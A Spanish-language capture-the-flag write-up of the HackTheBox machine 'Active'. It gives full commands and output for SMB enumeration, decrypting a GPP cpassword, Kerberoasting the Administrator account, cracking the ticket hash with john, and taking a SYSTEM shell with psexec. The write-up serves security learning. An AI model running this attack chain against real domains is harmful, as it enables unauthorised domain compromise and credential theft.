---
title: Active Writeup - HackTheBox
date: 2023-07-23
categories: [Writeups, HTB]
tags: [Windows, HTB, CTF, Active Directory, SMB, GPP Passwords, Kerberoasting Attack]
img_path: /assets/img/commons/active/
image: active.png
---

¡Saludos!

En este writeup, vamos a analizar la máquina [**Active**](https://app.hackthebox.com/machines/Active) de **HackTheBox**, clasificada con un nivel de dificultad **fácil** en la plataforma. Se trata de una máquina con sistema operativo **Windows** que nos permitirá practicar la técnica de **enumeración SMB**. Durante este proceso, encontraremos un archivo `Groups.xml` que contiene una contraseña cifrada con **AES-256**. Esta contraseña se ha establecido mediante **GPP (Group Policy Preferences)**, para descifrar la contraseña, usaremos la herramienta `gpp-decrypt`, que nos proporcionará las credenciales de un usuario del dominio. Con estas credenciales, podremos realizar un ataque **Kerberoasting**, que consiste en explotar una vulnerabilidad del protocolo Kerberos. Este ataque nos permitirá descubrir que la cuenta del **Administrador** tiene configurado un **SPN (Service Principal Name)**, lo que significa que podemos solicitar un **TGS (Ticket Granting Service)** para esa cuenta. Para ello, usaremos la utilidad `GetUserSPNs.py`, que nos devolverá el hash del TGS. A continuación, podremos descifrar el hash mediante un ataque de fuerza bruta offline y obtener la contraseña del Administrador. Finalmente, con la herramienta `psexec.py`, nos autenticaremos en la máquina víctima y conseguiremos el acceso completo.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.10.100
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=107 ms

--- 10.10.10.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.769/106.769/106.769/0.000 ms
```

Dado que el `TTL` es cercano a 128, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.10.100 -oG allPorts.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 22:13 -05
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 65479 closed tcp ports (reset), 33 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49168/tcp open  unknown
49169/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49168,49169 -sV -sC --min-rate 5000 10.10.10.100 -oN services.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 22:14 -05
Nmap scan report for 10.10.10.100
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-24 03:15:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-24T03:16:03
|_  start_date: 2023-07-24T00:01:08
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.52 seconds
```

El reporte de `Nmap` indica que nos encontramos con un Domain Controller de **Active Directory**, ya que se identificaron puertos comunes como el `88` (**Kerberos**), `389` (**LDAP**), `139` y `445` (**SMB**), `53` (**DNS**), entre otros. También se sugiere que el controlador de dominio es **Windows Server 2008 R2 SP1**. 

Además, se identificó el dominio `active.htb` y se agregó a `/etc/hosts` con la dirección IP de la máquina objetivo para una traducción correcta.

```bash
❯ echo "10.10.10.100\tactive.htb" >> /etc/hosts
```

### SMB - 139/445

Al disponer del servicio SMB, procedemos a llevar a cabo una enumeración de los recursos compartidos utilizando `smbmap`.

```bash
❯ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

Se observa que el único recurso compartido al que tenemos permisos de lectura es "**Replication**".

Enumeramos recursivamente los archivos y directorios almacenados en el recurso compartido y encontramos lo siguiente:

```bash
❯ smbmap -H 10.10.10.100 -R Replication
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 05:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Windows NT
```

Al revisar la estructura, parece ser una copia de **SYSVOL**. Esto es potencialmente interesante desde el punto de vista de la escalada de privilegios, ya que las directivas de grupo (y las preferencias de directivas de grupo) se almacenan en el recurso compartido **SYSVOL**, el cual es legible para todos los usuarios autenticados.

Dado este contexto, resulta relevante buscar el archivo `Groups.xml`, ya que a menudo contiene credenciales de Active Directory. En este caso, lo encontramos en la siguiente ruta: `Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`. Luego, procedimos a descargarlo en nuestra máquina local.

```bash
❯ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
[+] File output to: /home/juanr/CTF/HTB/Active/content/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

El contenido del archivo revela la contraseña encriptada `cpassword`.

```bash
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

En este punto, es importante señalar que las Preferencias de **Directiva de Grupo (GPP)** se introdujeron en **Windows Server 2008** y permitían a los administradores modificar usuarios y grupos en toda la red, entre otras características. Un caso de uso típico era cuando la imagen base de una empresa tenía una contraseña de administrador local débil y los administradores deseaban cambiarla a algo más seguro de manera retrospectiva. La contraseña definida se cifraba con `AES-256` y se almacenaba en el archivo `Groups.xml`.

Sin embargo, en algún momento de 2012, Microsoft publicó la clave AES en MSDN, lo que significa que las contraseñas establecidas mediante GPP ahora son triviales de descifrar y se consideran fácilmente accesibles.

Bajo este contexto, es posible descifrar la contraseña utilizando la utilidad `gpp-decrypt`.

```bash
❯ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Ahora tenemos conocimiento de que la cuenta de dominio `SVC_TGS` tiene la contraseña `GPPstillStandingStrong2k18`.

### Enumeración autenticada

Con credenciales válidas para el dominio `active.htb`, podemos proceder a la enumeración. Ahora tenemos acceso a los recursos compartidos **NETLOGON**, **SYSVOL** y **Users**.

```bash
❯ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY
```

En ese caso, podemos obtener la primera flag de la máquina descargándola desde la ruta `Users/SVC_TGS/Desktop/user.txt`.

```bash
❯ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download Users/SVC_TGS/Desktop/user.txt
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
[+] File output to: /home/juanr/CTF/HTB/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
```

Una vez en la máquina local, procedemos a leerla.

```bash
❯ cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt
23e281cd3bf13336****************
```

Utilizando `rpcclient`, procedemos a enumerar los usuarios del dominio.

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
```

Además, enumeramos los grupos del dominio.

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
```

Notamos que el único usuario en el grupo `Domain Admins` es `Administrator`.

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200"
	rid:[0x1f4] attr:[0x7]
```

```bash
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser 0x1f4"
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	dom, 23 jul 2023 19:02:28 -05
	Logoff Time              :	mié, 31 dic 1969 19:00:00 -05
	Kickoff Time             :	mié, 31 dic 1969 19:00:00 -05
	Password last set Time   :	mié, 18 jul 2018 14:06:40 -05
	Password can change Time :	jue, 19 jul 2018 14:06:40 -05
	Password must change Time:	mié, 13 sep 30828 21:48:05 -05
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000041
	padding1[0..7]...
	logon_hrs[0..21]...
```

## Explotación

---

### Kerberoasting Attack (GetUserSPNs.py)

La autenticación Kerberos emplea **Service Principal Names** (SPNs) para vincular una cuenta con una instancia de servicio específica.

`GetUserSPNs.py` es útil para identificar cuentas configuradas con SPNs.

```bash
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40  2023-07-23 19:02:27
```

Es evidente que la cuenta `active\Administrator` ha sido configurada con un **SPN**.

Además, `GetUserSPNs.py` también puede solicitar el TGS (Ticket Granting Service) y extraer su hash para descifrarlo offline.

```bash
❯ python2 /usr/local/bin/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40  2023-07-23 19:02:27 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$ed9b2b294623ae3bb7b6255f5acc42af$b6292c36bede82ac228353f151f973e98696422ffa850ab9b60534478d0047f79437d471326860edb4f4e1c40067b3efc9dd190186ac68fd7330a346cae805a79f48acc7ae0f2825819f47ed399101699c27b7b06dee597566ed8631ba1fe23aa0e7617d8ac477363c2d4a6b98a7513c7482390ec6b731ca39a2a8b44942413a65263c19ba5125e40aa34f549b0c783f7ab831518a0f5bbdc897942daebb088d6eb9d1608a30dc17a9da7fb666160042c4f9bd9de8b21a9a6471c99360f6b29ac7be47ac287e18df168ceeeff42521409d89bfa9267d9ab7675ae8b86e4286350523f7ba4d9746e9c9425f53fdd3d80ed078cb78f83f24ffea29dc65d618ed6f66648aacb9570f4d6af50cbd5b5f3c6ccd6b7e2ee9a0574fb0e403a31db99acc7a02c47b90db728b31953c7143b27d19cdbfa304e6e9b2c606168a255fc2b79ab9385e36c04d741a2bf7725f6f9d8c811c72e30203b1e604817964729e446f2e3e060e7bad4e7d46bb659f7f66ad544f5d3648fc6ac82cc20b652c9eb1bb6dde7bf3511acb4eb4dee30537be779b4db76e23fff41c6c4205762271f6327059048bb3982cdd208f3912ddffa0cbe31c02c3a1d146d67dd9df203f50be8af34365974524721658d4ebb75986ed2bb461503394b44afbe5d15c814ba0e39ef56798e17ec5bdd142a51b74ff5095123ce0eeb54680a684d15894a647b50961a55f006b5978b972ea283c34c9df837f2c45c5ac619e82f5f3748346138b9f927ca786dc739e7a6cf7813b9ece4f9734d8d1587e3a0e89bf5ee2e844a929af8c7b6b51e7b0fce99e8e78d50e80014b9c51fbcbcb8d65f4e168c4ecef45c2f030354248ed3afd0f1a17945311cc3efb77eeb0dacfc312aa11cc3c19ce7396534878ad7a63f5131cd5ad813df272658df117533d7e3611af9dbbb90d3526dc59367936317ad239be682660710035cd3d4248f7101a67d2295bb9bbee6d256be9242c3a4bea8968eb69cc100ce9a52e7cdedc3a4e85ffd36e761381d8fcb29f6f275a853eaa22ca10f6ca8ebaf563503de97cf2166a69131f193142021cfff7f5bbaddd652a73dc666823a2a52c15c7662fe443c7873753f6547bed210d1e95e55c085d3f1d764c74ca17b7595339e98ed33304211f8dc189bb3313db7ccacf75b677a60156f14eeb025eb7171c8cd6075a877c010422b74d7aa032e9bc4dd0606b1311f1eaa9af86638c3f12379b9ced9daf762facde3488503c88a7ac85
```

Crackeamos fácilmente el hash utilizando `john` y obtenemos la contraseña en texto plano.

```bash
❯ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:05 DONE (2023-07-24 01:23) 0.1984g/s 2090Kp/s 2090Kc/s 2090KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Validamos con `crackmapexec` para verificar si la contraseña es correcta.

```bash
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Ahora podemos utilizar `psexec.py` para obtener un shell como `nt authority\system`.

```bash
❯ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file bFasAtJO.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service qvnS on 10.10.10.100.....
[*] Starting service qvnS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Finalmente, leemos la flag root en la ruta habitual.

```bash
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
705b8532759d39c9****************
```

!Happy Hacking¡
